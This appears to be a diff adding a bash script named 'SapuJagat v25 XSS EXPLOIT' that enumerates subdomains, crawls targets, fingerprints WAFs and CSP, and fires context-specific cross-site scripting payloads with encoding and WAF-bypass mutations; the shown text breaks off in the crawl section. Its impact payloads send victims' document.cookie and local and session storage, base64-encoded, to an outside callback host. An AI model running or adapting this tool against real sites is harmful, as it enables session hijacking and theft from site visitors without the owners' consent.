@@ -1,0 +1,1863 @@
+#!/usr/bin/env bash
+# ============================================================
+#   SapuJagat v25 XSS EXPLOIT — Single File
+#   by BimaKesengsaraan · Karya anak bangsa
+#   PART 1/4: core, log, http, util
+# ============================================================
+
+set -uo pipefail
+
+VERSION="25.0.0"
+UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+
+# ── CONFIG ──
+TIMEOUT=15
+MAX_ROTATION=12
+MAX_URLS=500
+STRICT_CONTENT_TYPE=1
+MIN_REFLECTION_LEN=8
+WAF_BLOCK_MAX_LEN=800
+MAX_REDIRECTS=5
+RETRY_COUNT=2
+RETRY_DELAY=2
+AUTO_BYPASS=1
+TECH_PAYLOAD=1
+IMPACT_PAYLOAD=1
+VERIFY_IMPACT=1
+DOM_SCAN=0
+STORED_VERIFY=1
+CSP_DETECT=1
+OUTDIR_BASE="./sapujagat-out"
+
+MODE="normal"
+DRY_RUN=0
+VERBOSE=0
+QUIET=0
+INSECURE=1
+SKIP_SUBENUM=0
+DO_CRAWL=1
+DO_DISCOVERY=1
+DO_CALLBACK=0
+
+INPUT_MODE=""
+TARGET=""
+URL_LIST=""
+DOMAIN=""
+OUTDIR=""
+PROXY=""
+COOKIE=""
+JSON_LOG=""
+VULN_LOG=""
+CB_LAST_CTYPE=""
+CB_LAST_STATUS=""
+CB_LAST_HEADERS=""
+WAF_TYPE="unknown"
+TECH_STACK=""
+CSP_MODE="none"
+INTERACTSH_DOMAIN=""
+CALLBACK_URL=""
+ADMIN_PANEL=""
+INTERACTSH_PID=""
+
+STAT_URLS=0
+STAT_PARAMS=0
+STAT_FINDINGS=0
+STAT_FP_FILTERED=0
+STAT_BYPASS=0
+STAT_PAYLOADS=0
+STAT_IMPACT=0
+STAT_CALLBACKS=0
+STAT_VERIFIED=0
+
+R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; B='\033[0;34m'
+C='\033[0;36m'; M='\033[0;35m'; W='\033[1;37m'; D='\033[2m'; NC='\033[0m'
+
+# ════════════════════════════════════════════════════════════
+#  LOGGING
+# ════════════════════════════════════════════════════════════
+info()  { (( QUIET == 0 )) && echo -e "   ${B}●${NC} $*"; }
+ok()    { (( QUIET == 0 )) && echo -e "   ${G}✓${NC} $*"; }
+warn()  { (( QUIET == 0 )) && echo -e "   ${Y}▲${NC} $*" >&2; }
+err()   { echo -e "   ${R}✖${NC} $*" >&2; }
+hit()   { echo -e "   ${M}★${NC} $*"; }
+vlog()  { (( VERBOSE == 1 )) && echo -e "   ${D}·${NC} $*"; }
+
+BANNER() {
+    echo -e "${M}"
+    cat <<'EOF'
+   ███████╗ █████╗ ██████╗ ██╗   ██╗     ██╗ █████╗  ██████╗  █████╗ ████████╗
+   ██╔════╝██╔══██╗██╔══██╗██║   ██║     ██║██╔══██╗██╔════╝ ██╔══██╗╚══██╔══╝
+   ███████╗███████║██████╔╝██║   ██║     ██║███████║██║  ███╗███████║   ██║
+   ╚════██║██╔══██║██╔═══╝ ██║   ██║██   ██║██╔══██║██║   ██║██╔══██║   ██║
+   ███████║██║  ██║██║     ███████╗╚█████╔╝██║  ██║╚██████╔╝██║  ██║   ██║
+   ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝
+EOF
+    echo -e "${C}              SapuJagat v$VERSION XSS EXPLOIT"
+    echo -e "${W}                    by BimaKesengsaraan${NC}"
+    echo -e "${D}                       Karya anak bangsa${NC}"
+    echo -e "${M}   ═══════════════════════════════════════════════════════════════════${NC}"
+    echo ""
+}
+
+box_title() {
+    local title="${1:-}"
+    local len=${#title}
+    local pad=$(( (70 - len) / 2 ))
+    (( pad < 0 )) && pad=0
+    echo ""
+    echo -e "${C}   ╔═══════════════════════════════════════════════════════════════════╗${NC}"
+    printf "${C}   ║${NC}%*s${W}%s${NC}%*s${C}║${NC}\n" "$pad" "" "$title" "$((70 - len - pad))" ""
+    echo -e "${C}   ╚═══════════════════════════════════════════════════════════════════╝${NC}"
+    echo ""
+}
+
+phase_tag() {
+    local n="${1:-}"; local total="${2:-}"; local name="${3:-}"
+    echo ""
+    echo -e "${M}   ┌─ [${W}${n}/${total}${M}]${NC} ${W}${name}${NC}"
+    echo -e "${M}   │${NC}"
+}
+phase_end() { echo -e "${M}   └─ done${NC}"; }
+kv() { printf "   ${B}%-18s${NC} ${W}%s${NC}\n" "${1:-}" "${2:-}"; }
+
+detect_env() {
+    if [[ -n "${TERMUX_VERSION:-}" || -d "/data/data/com.termux" ]]; then
+        TIMEOUT=10
+    fi
+}
+
+detect_domain() {
+    local t="${1:-}"
+    if [[ -f "$t" ]]; then
+        head -1 "$t" 2>/dev/null | sed 's|https\?://||; s|/.*||; s|:.*||' | xargs
+    elif [[ "$t" =~ ^https?:// ]]; then
+        echo "$t" | awk -F/ '{print $3}' | sed 's/:.*//'
+    else
+        echo "$t" | sed 's|https\?://||; s|/.*||; s|,.*||' | xargs
+    fi
+}
+
+log_init() {
+    local name
+    name=$(echo "${DOMAIN:-${TARGET:-scan}}" | sed 's|/|_|g; s|:.*||' | cut -c1-60)
+    [[ -z "$name" ]] && name="scan"
+    OUTDIR="${OUTDIR_BASE}/${name}-$(date +%Y%m%d-%H%M%S)"
+    mkdir -p "$OUTDIR"/{subs,urls,logs,reports,urls/sources,callbacks,exploits,impact}
+    JSON_LOG="$OUTDIR/findings.json"
+    VULN_LOG="$OUTDIR/vulnerable.txt"
+    echo '[]' > "$JSON_LOG"
+    : > "$VULN_LOG"
+}
+
+cleanup() {
+    [[ -n "$OUTDIR" ]] && echo -e "\n   ${Y}Interrupted. Output: $OUTDIR${NC}"
+    exit 130
+}
+trap cleanup INT TERM
+
+log_candidate() {
+    [[ -z "$OUTDIR" ]] && return
+    local url="$1" param="$2" payload="$3" reason="$4"
+    echo "{\"ts\":\"$(date -Iseconds)\",\"url\":\"$url\",\"param\":\"$param\",\"payload\":\"${payload//\"/\\\"}\",\"reason\":\"$reason\"}" >> "$OUTDIR/candidates.jsonl"
+    STAT_FP_FILTERED=$((STAT_FP_FILTERED+1))
+}
+
+_curl() {
+    local url="${1:-}"
+    shift || true
+    [[ -z "$url" ]] && return 1
+
+    if (( DRY_RUN == 1 )); then
+        echo "<DRY-RUN>"
+        CB_LAST_CTYPE="text/html"
+        CB_LAST_STATUS="200"
+        CB_LAST_HEADERS=""
+        return 0
+    fi
+
+    local tls="-k"
+    (( INSECURE == 0 )) && tls=""
+
+    local hdr_file; hdr_file=$(mktemp)
+    local args=(-s -A "$UA" --compressed --max-time "$TIMEOUT" --connect-timeout "$TIMEOUT" --max-redirs "$MAX_REDIRECTS" -L)
+    [[ -n "$tls" ]] && args+=("$tls")
+    [[ -n "$PROXY" ]] && args+=(--proxy "$PROXY")
+    [[ -n "$COOKIE" ]] && args+=(-H "Cookie: $COOKIE")
+
+    local attempt=0
+    while (( attempt < RETRY_COUNT )); do
+        local out code ctype
+        out=$(curl "${args[@]}" -D "$hdr_file" -w '\n__C__%{http_code}\n__T__%{content_type}' "$@" "$url" 2>/dev/null) || out=""
+        code=$(echo "$out" | grep -oP '__C__\K\d+' | head -1)
+        ctype=$(echo "$out" | grep -oP '__T__\K.*' | head -1)
+        out=$(echo "$out" | sed 's/__C__[0-9]*//; s/__T__.*//')
+
+        CB_LAST_CTYPE="$ctype"
+        CB_LAST_STATUS="${code:-000}"
+        CB_LAST_HEADERS=$(cat "$hdr_file" 2>/dev/null || echo "")
+        rm -f "$hdr_file"
+
+        case "${code:-000}" in
+            200|201|202|204|301|302|303|307|308|400|401|403|404|405|410|451)
+                echo "$out"; return 0 ;;
+            429|503)
+                (( attempt == 0 )) && sleep "$RETRY_DELAY" && attempt=$((attempt+1)) || return 1 ;;
+            5*|000|"")
+                (( attempt == 0 )) && sleep "$RETRY_DELAY" && attempt=$((attempt+1)) || return 1 ;;
+            *)
+                echo "$out"; return 0 ;;
+        esac
+    done
+    return 1
+}
+
+_curl_cookie() {
+    local url="$1" cookie="$2"; shift 2 || true
+    [[ -z "$url" || -z "$cookie" ]] && return 1
+    (( DRY_RUN == 1 )) && { echo "<DRY-RUN>"; return 0; }
+    local tls="-k"; (( INSECURE == 0 )) && tls=""
+    local args=(-s -A "$UA" --compressed --max-time "$TIMEOUT" --connect-timeout "$TIMEOUT" --max-redirs "$MAX_REDIRECTS" -L -H "Cookie: $cookie")
+    [[ -n "$tls" ]] && args+=("$tls")
+    [[ -n "$PROXY" ]] && args+=(--proxy "$PROXY")
+    curl "${args[@]}" "$@" "$url" 2>/dev/null
+}
+
+is_xss_ctype() {
+    local ct="${1:-}"
+    [[ -z "$ct" ]] && return 0
+    echo "$ct" | grep -qiE 'text/html|application/xhtml|image/svg\+xml|application/xml|text/xml' && return 0
+    return 1
+}
+
+looks_blocked() {
+    local body="${1:-}" status="${2:-}"
+    (( ${#body} > WAF_BLOCK_MAX_LEN )) && return 1
+    case "$status" in
+        403|406|429|503)
+            echo "$body" | grep -qiE 'access denied|request blocked|forbidden|not acceptable|cloudflare|incapsula|sucuri|attention required|waf' && return 0 ;;
+    esac
+    return 1
+}
+
+is_encoded_reflection() {
+    local body="${1:-}" payload="${2:-}"
+    echo "$body" | grep -qF "$payload" && return 1
+    local enc="${payload//</\&lt;}"
+    enc="${enc//>/\&gt;}"
+    enc="${enc//\"/\&quot;}"
+    echo "$body" | grep -qF "$enc" && return 0
+    return 1
+}
+
+build_url() {
+    local url="$1" key="$2" value="$3"
+    python3 - "$url" "$key" "$value" <<'PY'
+import sys, urllib.parse
+url, key, val = sys.argv[1], sys.argv[2], sys.argv[3]
+p = urllib.parse.urlparse(url)
+q = urllib.parse.parse_qs(p.query, keep_blank_values=True)
+q[key] = [val]
+new_q = "&".join(f"{urllib.parse.quote(k)}={urllib.parse.quote(v)}" for k, vs in q.items() for v in vs)
+print(urllib.parse.urlunparse((p.scheme, p.netloc, p.path, p.params, new_q, p.fragment)))
+PY
+}
+
+url_has_skip_ext() {
+    local path="${1%%\?*}"; path="${path%%#*}"
+    local ext="${path##*.}"
+    ext=$(echo "$ext" | tr '[:upper:]' '[:lower:]')
+    echo "$ext" | grep -qE '^(js|css|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|mp4|mp3|pdf|zip|tar|gz|rar|7z|exe|dmg|map)$'
+}
+
+detect_context_at_marker() {
+    local body="${1:-}" marker="${2:-}"
+    local pos
+    pos=$(echo "$body" | grep -boF "$marker" 2>/dev/null | head -1 | cut -d: -f1)
+    [[ -z "$pos" ]] && { echo "unknown"; return; }
+    local pre; pre=$(echo "$body" | head -c "$pos")
+    [[ -z "$pre" ]] && { echo "body"; return; }
+
+    local window="${pre: -300}"
+
+    echo "$window" | grep -q '<!--' && ! echo "$window" | grep -q -- '-->' && { echo "comment"; return; }
+    if echo "$window" | grep -qiE '<(textarea|title)[^>]*>[^<]*$'; then echo "rcdata"; return; fi
+    if echo "$window" | grep -qiE '<script[^>]*>[^<]*$'; then echo "script"; return; fi
+    if echo "$window" | grep -qiE '<style[^>]*>[^<]*$'; then echo "style"; return; fi
+
+    local tail; tail=$(echo "$window" | grep -oE '<[^>]*$' | tail -1)
+    if [[ -n "$tail" ]]; then
+        local dq; dq=$(echo "$tail" | grep -o '"' | wc -l)
+        local sq; sq=$(echo "$tail" | grep -o "'" | wc -l)
+        (( dq % 2 == 1 )) && { echo "attr-dq"; return; }
+        (( sq % 2 == 1 )) && { echo "attr-sq"; return; }
+        echo "$tail" | grep -qiE 'href=["'"'"']?$' && { echo "href"; return; }
+        echo "$tail" | grep -qiE 'src=["'"'"']?$' && { echo "src"; return; }
+        echo "$tail" | grep -qE '=\s*[^"'"'"' >]*$' && { echo "attr-unquoted"; return; }
+    fi
+    echo "body"
+}
+
+context_allows_inline() {
+    case "${1:-}" in
+        body|unknown|script|attr-dq|attr-sq|attr-unquoted|href|src) return 0 ;;
+        *) return 1 ;;
+    esac
+}
+
+# ════════════════════════════════════════════════════════════
+#  PART 2 — PAYLOAD LIBRARY + MUTATION + FILTER ANALYSIS
+# ════════════════════════════════════════════════════════════
+
+# ════════════════════════════════════════════════════════════
+#  FILTER FEEDBACK — 20+ probe
+# ════════════════════════════════════════════════════════════
+analyze_filter() {
+    local url="$1" param="$2"
+    local marker="sjf${RANDOM}${RANDOM}"
+
+    local probe="Aa1${marker}<script>alert(1)</script><svg/onload=confirm(1)><img src=x onerror=prompt(1)>\"dq'sq/slash\`bt+plus&amp#hash%percent"
+
+    local inj; inj=$(build_url "$url" "$param" "$probe")
+    local resp; resp=$(_curl "$inj") || { echo "NONE"; return 1; }
+
+    looks_blocked "$resp" "$CB_LAST_STATUS" && { echo "BLOCKED"; return 1; }
+
+    if ! echo "$resp" | grep -qF "$marker"; then
+        echo "NONE"; return 1
+    fi
+
+    local flags=""
+    echo "$resp" | grep -qF '<script'  && flags+="SCRIPT_OK,"
+    echo "$resp" | grep -qF '<svg'     && flags+="SVG_OK,"
+    echo "$resp" | grep -qF '<img'     && flags+="IMG_OK,"
+    echo "$resp" | grep -qF 'onload'   && flags+="ONLOAD_OK,"
+    echo "$resp" | grep -qF 'onerror'  && flags+="ONERROR_OK,"
+    echo "$resp" | grep -qF 'alert'    && flags+="ALERT_OK,"
+    echo "$resp" | grep -qF 'confirm'  && flags+="CONFIRM_OK,"
+    echo "$resp" | grep -qF 'prompt'   && flags+="PROMPT_OK,"
+    echo "$resp" | grep -qF '()'       && flags+="PAREN_OK,"
+    echo "$resp" | grep -qF '"'        && flags+="DQ_OK,"
+    echo "$resp" | grep -qF "'"        && flags+="SQ_OK,"
+    echo "$resp" | grep -qF '\`'       && flags+="BT_OK,"
+    echo "$resp" | grep -qF '/'        && flags+="SLASH_OK,"
+    echo "$resp" | grep -qF '+'        && flags+="PLUS_OK,"
+    echo "$resp" | grep -qF '&'        && flags+="AMP_OK,"
+    echo "$resp" | grep -qF '#'        && flags+="HASH_OK,"
+    echo "$resp" | grep -qF '%'        && flags+="PCT_OK,"
+
+    local enc_found=0
+    echo "$resp" | grep -qF '&lt;script' && enc_found=1
+    echo "$resp" | grep -qF '&lt;svg'    && enc_found=1
+    echo "$resp" | grep -qF '&lt;img'    && enc_found=1
+    (( enc_found == 1 )) && flags+="ENCODED,"
+
+    echo "${flags:-NONE}"
+}
+
+# ════════════════════════════════════════════════════════════
+#  PAYLOAD LIBRARY — per context
+# ════════════════════════════════════════════════════════════
+payloads_body() {
+    echo '<script>alert(document.domain)</script>'
+    echo '<script>alert(1)</script>'
+    echo '<img src=x onerror=alert(document.domain)>'
+    echo '<img src=x onerror=alert(1)>'
+    echo '<svg onload=alert(document.domain)>'
+    echo '<svg/onload=alert(1)>'
+    echo '<details open ontoggle=alert(1)>'
+    echo '<body onload=alert(1)>'
+    echo '<marquee onstart=alert(1)>'
+    echo '<video><source onerror=alert(1)>'
+    echo '<audio src=x onerror=alert(1)>'
+    echo '<iframe srcdoc="<script>alert(1)</script>">'
+    echo '<object data="javascript:alert(1)">'
+    echo '<embed src="javascript:alert(1)">'
+    echo '<svg><animate onbegin=alert(1) attributeName=x dur=1s>'
+    echo '<form><button formaction=javascript:alert(1)>x'
+    echo '<input autofocus onfocus=alert(1)>'
+    echo '<select autofocus onfocus=alert(1)>'
+    echo '<textarea autofocus onfocus=alert(1)>'
+    echo '<keygen autofocus onfocus=alert(1)>'
+}
+
+payloads_attr_dq() {
+    echo '" onfocus=alert(1) autofocus="'
+    echo '" onmouseover=alert(1) x="'
+    echo '" onclick=alert(1) x="'
+    echo '" onpointerover=alert(1) x="'
+    echo '" onanimationstart=alert(1) x="'
+    echo '"><script>alert(1)</script>'
+    echo '"><img src=x onerror=alert(1)>'
+    echo '"><svg onload=alert(1)>'
+    echo '"><details open ontoggle=alert(1)>'
+    echo '"autofocus onfocus=alert(1) x="'
+    echo '" onload=alert(1) x="'
+    echo '" onerror=alert(1) x="'
+    echo '"onfocus=alert(1) autofocus"'
+    echo '" onclick=alert(document.domain) x="'
+}
+
+payloads_attr_sq() {
+    echo "' onfocus=alert(1) autofocus='"
+    echo "' onmouseover=alert(1) x='"
+    echo "' onclick=alert(1) x='"
+    echo "'><script>alert(1)</script>"
+    echo "'><img src=x onerror=alert(1)>"
+    echo "'><svg onload=alert(1)>"
+    echo "' onpointerover=alert(1) x='"
+    echo "'autofocus onfocus=alert(1) x='"
+}
+
+payloads_attr_unquoted() {
+    echo 'x onmouseover=alert(1)'
+    echo 'x/onmouseover=alert(1)'
+    echo 'x onclick=alert(1)'
+    echo 'x onfocus=alert(1) autofocus'
+    echo 'x onpointerover=alert(1)'
+}
+
+payloads_script() {
+    echo "';alert(1)//"
+    echo "'-alert(1)-'"
+    echo '";alert(1)//'
+    echo '"-alert(1)-"'
+    echo '</script><script>alert(1)</script>'
+    echo '</script><svg onload=alert(1)>'
+    echo '</script><img src=x onerror=alert(1)>'
+    echo "';alert(document.domain)//"
+    echo "1;alert(1)"
+    echo "\\';alert(1)//"
+}
+
+payloads_href() {
+    echo 'javascript:alert(1)'
+    echo 'javascript&colon;alert(1)'
+    echo 'data:text/html,<script>alert(1)</script>'
+    echo 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
+    echo 'javascript:confirm(1)'
+    echo 'javascript:alert(document.domain)'
+    echo 'JaVaScRiPt:alert(1)'
+}
+
+payloads_src() {
+    echo 'x" onerror="alert(1)'
+    echo "x' onerror='alert(1)"
+    echo 'data:,alert(1)'
+    echo 'javascript:alert(1)'
+}
+
+payloads_rcdata() {
+    echo '</textarea><script>alert(1)</script>'
+    echo '</title><svg onload=alert(1)>'
+    echo '</textarea><img src=x onerror=alert(1)>'
+    echo '</title><img src=x onerror=alert(1)>'
+    echo '</textarea><svg/onload=alert(1)>'
+}
+
+payloads_comment() {
+    echo '--><script>alert(1)</script>'
+    echo '--><svg onload=alert(1)>'
+    echo '--><img src=x onerror=alert(1)>'
+}
+
+payloads_style() {
+    echo '</style><script>alert(1)</script>'
+    echo '</style><svg onload=alert(1)>'
+    echo '</style><img src=x onerror=alert(1)>'
+}
+
+# ════════════════════════════════════════════════════════════
+#  CONTEXT → PAYLOAD MATRIX
+# ════════════════════════════════════════════════════════════
+select_payloads_by_context() {
+    local ctx="$1" flags="$2"
+    local -a out=()
+
+    case "$ctx" in
+        body|unknown)
+            while IFS= read -r p; do out+=("$p"); done < <(payloads_body)
+            ;;
+        attr-dq)
+            while IFS= read -r p; do out+=("$p"); done < <(payloads_attr_dq)
+            ;;
+        attr-sq)
+            while IFS= read -r p; do out+=("$p"); done < <(payloads_attr_sq)
+            ;;
+        attr-unquoted)
+            while IFS= read -r p; do out+=("$p"); done < <(payloads_attr_unquoted)
+            ;;
+        script)
+            while IFS= read -r p; do out+=("$p"); done < <(payloads_script)
+            ;;
+        href)
+            while IFS= read -r p; do out+=("$p"); done < <(payloads_href)
+            ;;
+        src)
+            while IFS= read -r p; do out+=("$p"); done < <(payloads_src)
+            ;;
+        rcdata)
+            while IFS= read -r p; do out+=("$p"); done < <(payloads_rcdata)
+            ;;
+        comment)
+            while IFS= read -r p; do out+=("$p"); done < <(payloads_comment)
+            ;;
+        style)
+            while IFS= read -r p; do out+=("$p"); done < <(payloads_style)
+            ;;
+        *)
+            while IFS= read -r p; do out+=("$p"); done < <(payloads_body)
+            ;;
+    esac
+
+    # fallback kalau payload context gak kerja — coba body
+    if [[ "$ctx" != "body" && "$ctx" != "unknown" ]]; then
+        while IFS= read -r p; do out+=("$p"); done < <(payloads_body)
+    fi
+
+    # WAF bypass
+    (( AUTO_BYPASS == 1 )) && while IFS= read -r wp; do
+        [[ -z "$wp" ]] && continue
+        out+=("$wp")
+    done < <(waf_bypass_payloads)
+
+    # tech
+    (( TECH_PAYLOAD == 1 )) && while IFS= read -r tp; do
+        [[ -z "$tp" ]] && continue
+        out+=("$tp")
+    done < <(tech_payloads)
+
+    # impact
+    (( IMPACT_PAYLOAD == 1 )) && {
+        local cb="${CALLBACK_URL:-cx.oast.fun}"
+        out+=("<script>fetch('//${cb}/?c='+btoa(document.cookie))</script>")
+        out+=("<img src=x onerror=\"fetch('//${cb}/?c='+btoa(document.cookie))\">")
+        out+=("<svg onload=\"fetch('//${cb}/?c='+btoa(document.cookie))\">")
+        out+=("<script>fetch('//${cb}/?ls='+btoa(JSON.stringify({...localStorage,...sessionStorage})))</script>")
+    }
+
+    printf '%s\n' "${out[@]}"
+}
+
+# ════════════════════════════════════════════════════════════
+#  MUTATION ENGINE — 25+ mutations
+# ════════════════════════════════════════════════════════════
+mutate_payload() {
+    local base="$1"
+    local -a muts=("$base")
+
+    local urlenc; urlenc=$(printf '%s' "$base" | jq -sRr @uri 2>/dev/null)
+    [[ -n "$urlenc" ]] && muts+=("$urlenc")
+
+    local dbl; dbl=$(printf '%s' "$urlenc" | jq -sRr @uri 2>/dev/null)
+    [[ -n "$dbl" ]] && muts+=("$dbl")
+
+    local b64; b64=$(printf 'alert(document.domain)' | base64 -w0 2>/dev/null || printf 'alert(document.domain)' | base64)
+    muts+=("<script>eval(atob('${b64}'))</script>")
+
+    muts+=("<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>")
+
+    local case_flip; case_flip=$(echo "$base" | sed 's/<script/<ScRiPt/gI; s/<svg/<SvG/gI; s/<img/<ImG/gI')
+    muts+=("$case_flip")
+
+    muts+=("<script>\\u0061lert(1)</script>")
+
+    printf '%s\n' "${muts[@]}"
+}
+
+# ════════════════════════════════════════════════════════════
+#  WAF + TECH + IMPACT
+# ════════════════════════════════════════════════════════════
+fingerprint_waf() {
+    local targets="$1"
+    [[ ! -s "$targets" ]] && return
+    local host; host=$(head -1 "$targets" | awk -F/ '{print $3}')
+    [[ -z "$host" ]] && return
+    local hdr
+    hdr=$(curl -skI --max-time 10 "https://$host" 2>/dev/null || echo "")
+    if echo "$hdr" | grep -qiE '^server:.*cloudflare|^cf-ray'; then WAF_TYPE="cloudflare"
+    elif echo "$hdr" | grep -qiE '^server:.*akamai|^akamai-grn'; then WAF_TYPE="akamai"
+    elif echo "$hdr" | grep -qiE '^x-sucuri'; then WAF_TYPE="sucuri"
+    elif echo "$hdr" | grep -qiE '^x-iinfo|^server:.*incapsula'; then WAF_TYPE="imperva"
+    elif echo "$hdr" | grep -qiE '^x-cdn:.*fastly|^server:.*fastly'; then WAF_TYPE="fastly"
+    fi
+    [[ "$WAF_TYPE" == "unknown" ]] && ok "No WAF" || warn "WAF: $WAF_TYPE"
+}
+
+waf_bypass_payloads() {
+    case "$WAF_TYPE" in
+        cloudflare)
+            echo '<svg/onload=alert(1)>'
+            echo '<svg	onload=alert(1)>'
+            echo '<svg%0aonload=alert(1)>'
+            echo '<details/open/ontoggle=alert(1)>'
+            echo '<img/src=x/onerror=alert(1)>'
+            ;;
+        akamai)
+            echo '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">'
+            echo '<a href="javas&#99;ript:alert(1)">x</a>'
+            ;;
+        imperva)
+            echo '<img/src="x"/onerror="alert(1)">'
+            echo '<svg><use href=//x/%23x onload=alert(1)>'
+            ;;
+        sucuri)
+            echo '<body/onload=alert(1)>'
+            echo '<svg><animate onbegin=alert(1) attributeName=x dur=1s>'
+            ;;
+        fastly)
+            echo '<img src=x onerror=alert(1) x='
+            echo '<svg><script href=data:,alert(1) />'
+            ;;
+    esac
+}
+
+tech_payloads() {
+    case ",$TECH_STACK," in
+        *,wordpress,*) echo '<img src=x onerror=alert(1)>'; echo '"><script>alert(1)</script>' ;;
+    esac
+    case ",$TECH_STACK," in
+        *,nextjs,*) echo '<img src=x onerror=alert(1)>' ;;
+    esac
+    case ",$TECH_STACK," in
+        *,django,*) echo '{{constructor.constructor("alert(1)")()}}' ;;
+    esac
+    case ",$TECH_STACK," in
+        *,laravel,*) echo '{{constructor.constructor("alert(1)")()}}'; echo '{{7*7}}' ;;
+    esac
+    case ",$TECH_STACK," in
+        *,vue,*) echo '{{constructor.constructor("alert(1)")()}}' ;;
+    esac
+    case ",$TECH_STACK," in
+        *,angular,*) echo '<div ng-app ng-csp><div ng-click="$event.view.alert(1)">x</div></div>' ;;
+    esac
+    case ",$TECH_STACK," in
+        *,react,*) echo '<svg onload=alert(1)>' ;;
+    esac
+    case ",$TECH_STACK," in
+        *,jquery,*) echo '<img src=x onerror=alert(1)>' ;;
+    esac
+}
+
+detect_impact() {
+    local payload="$1"
+    local p_lower=$(echo "$payload" | tr 'A-Z' 'a-z')
+    echo "$p_lower" | grep -qE '169\.254|metadata' && { echo "ssrf-metadata|critical|XSS → SSRF → cloud metadata"; return 0; }
+    echo "$p_lower" | grep -qE 'document\.cookie' && { echo "cookie-exfil|critical|XSS → cookie exfil"; return 0; }
+    echo "$p_lower" | grep -qE 'localstorage|sessionstorage' && { echo "storage-dump|high|XSS → storage dump"; return 0; }
+    echo "alert-only|medium|XSS → alert"
+}
+
+detect_csp() {
+    local targets="$1"
+    (( CSP_DETECT == 1 )) || return
+    [[ ! -s "$targets" ]] && return
+    local url; url=$(head -1 "$targets")
+    local csp
+    csp=$(curl -skI --max-time 10 "$url" 2>/dev/null | grep -i '^content-security-policy:' | grep -iv 'report-only' | head -1)
+    if [[ -z "$csp" ]]; then
+        CSP_MODE="none"
+        ok "No CSP"
+        return
+    fi
+    local mode="restrictive"
+    echo "$csp" | grep -qi "unsafe-inline" && mode="unsafe-inline"
+    echo "$csp" | grep -qi "nonce-"         && mode="nonce"
+    echo "$csp" | grep -qi "strict-dynamic" && mode="strict-dynamic"
+    echo "$csp" | grep -qi "script-src.*data:" && mode="data-allowed"
+    CSP_MODE="$mode"
+    warn "CSP: $mode"
+}
+
+csp_confidence_adjust() {
+    local conf="${1:-}"
+    case "$CSP_MODE" in
+        unsafe-inline|none|data-allowed) echo "$conf" ;;
+        nonce|strict-dynamic|restrictive) echo "low" ;;
+        *) echo "$conf" ;;
+    esac
+}
+
+# ════════════════════════════════════════════════════════════
+#  PART 3 — ENUM, CRAWL, DISCOVERY, SCAN LOOP
+# ════════════════════════════════════════════════════════════
+
+# ════════════════════════════════════════════════════════════
+#  ENUM
+# ════════════════════════════════════════════════════════════
+enum_subdomains() {
+    local target="${1:-}"
+    target=$(echo "$target" | sed 's|https\?://||; s|/.*||; s|:.*||' | xargs)
+    [[ -z "$target" ]] && return
+
+    info "Subdomain enum: $target"
+    : > "$OUTDIR/subs/raw.txt"
+
+    if command -v subfinder &>/dev/null; then
+        timeout 120 subfinder -d "$target" -silent -no-color 2>/dev/null | \
+            grep -iE "\.${target}$|^${target}$" | sort -u > "$OUTDIR/subs/raw.txt" || true
+    fi
+
+    local count; count=$(wc -l < "$OUTDIR/subs/raw.txt" 2>/dev/null || echo 0)
+    (( count == 0 )) && { warn "subfinder: 0 hasil"; return; }
+
+    if command -v httpx &>/dev/null; then
+        timeout 120 httpx -l "$OUTDIR/subs/raw.txt" -silent -no-color -o "$OUTDIR/subs/live.txt" 2>/dev/null || \
+            cp "$OUTDIR/subs/raw.txt" "$OUTDIR/subs/live.txt"
+    else
+        cp "$OUTDIR/subs/raw.txt" "$OUTDIR/subs/live.txt"
+    fi
+
+    count=$(wc -l < "$OUTDIR/subs/live.txt" 2>/dev/null || echo 0)
+    ok "Live: $count"
+}
+
+# ════════════════════════════════════════════════════════════
+#  CRAWL
+# ════════════════════════════════════════════════════════════
+crawl_all() {
+    local target="${1:-}" listfile="${2:-}"
+    info "Crawl"
+    : > "$OUTDIR/urls/raw.txt"
+    mkdir -p "$OUTDIR/urls/sources"
+
+    local domain=""
+    if [[ -n "$target" ]]; then
+        if [[ "$target" =~ ^https?:// ]]; then
+            echo "$target" >> "$OUTDIR/urls/raw.txt"
+            domain=$(echo "$target" | awk -F/ '{print $3}' | sed 's/:.*//')
+        else
+            domain=$(echo "$target" | sed 's|https\?://||; s|/.*||; s|,.*||' | xargs)
+            echo "https://$domain" >> "$OUTDIR/urls/raw.txt"
+        fi
+    fi
+
+    if [[ -n "$domain" ]]; then
+        : > "$OUTDIR/urls/sources/sitemap.txt"
+        timeout 15 curl -sk --max-time 15 -A "$UA" "https://$domain/sitemap.xml" 2>/dev/null | \
+            grep -oE '<loc>[^<]+</loc>' | sed 's/<[^>]*>//g' >> "$OUTDIR/urls/sources/sitemap.txt"
+
+        : > "$OUTDIR/urls/sources/wayback.txt"
+        if command -v gau &>/dev/null; then
+            timeout 60 gau --threads 5 "$domain" 2>/dev/null | \
+                grep -iE "\.${domain}|^${domain}" >> "$OUTDIR/urls/sources/wayback.txt" || true
+        fi
+        if command -v waybackurls &>/dev/null; then
+            timeout 60 waybackurls "$domain" 2>/dev/null | \
+                grep -iE "\.${domain}|^${domain}" >> "$OUTDIR/urls/sources/wayback.txt" || true
+        fi
+        if command -v paramspider &>/dev/null; then
+            vlog "↳ paramspider"
+            timeout 90 paramspider -d "$domain" -s -q 2>/dev/null | \
+                grep -iE "\.${domain}|^${domain}" >> "$OUTDIR/urls/sources/wayback.txt" || true
+        fi
+        sort -u "$OUTDIR/urls/sources/wayback.txt" -o "$OUTDIR/urls/sources/wayback.txt" 2>/dev/null || true
+    fi
+
+    if command -v katana &>/dev/null; then
+        : > "$OUTDIR/urls/sources/katana.txt"
+        local ct="$OUTDIR/urls/sources/crawl-targets.txt"
+        : > "$ct"
+        [[ -s "$OUTDIR/subs/live.txt" ]] && cat "$OUTDIR/subs/live.txt" >> "$ct"
+        [[ ! -s "$ct" && -n "$domain" ]] && echo "$domain" >> "$ct"
+        if [[ -s "$ct" ]]; then
+            local depth=2
+            [[ "$MODE" == "deep" ]] && depth=3
